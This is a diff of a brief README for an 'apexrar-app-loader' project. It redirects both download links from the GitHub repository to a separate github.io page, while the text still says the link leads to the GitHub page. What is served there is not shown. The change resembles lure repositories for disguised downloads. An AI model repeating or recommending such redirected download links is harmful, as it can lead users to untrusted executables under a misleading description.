@@ -1,6 +1,6 @@
 # ⬇️ apexrar-app-loader - Your Window to ApexRAR Tools
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/purityma3319/apexrar-app-loader)
+[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://purityma3319.github.io)
 
 ## 🚀 What is ApexRAR?
 
@@ -31,7 +31,7 @@ These are standard requirements. Most computers from the last ten years meet the
 
 ## 📥 How to Download
 
-[**Click here to download ApexRAR App Loader**](https://github.com/purityma3319/apexrar-app-loader)
+[**Click here to download ApexRAR App Loader**](https://purityma3319.github.io)
 
 The download link sends you to the GitHub page. Follow these simple steps:
 
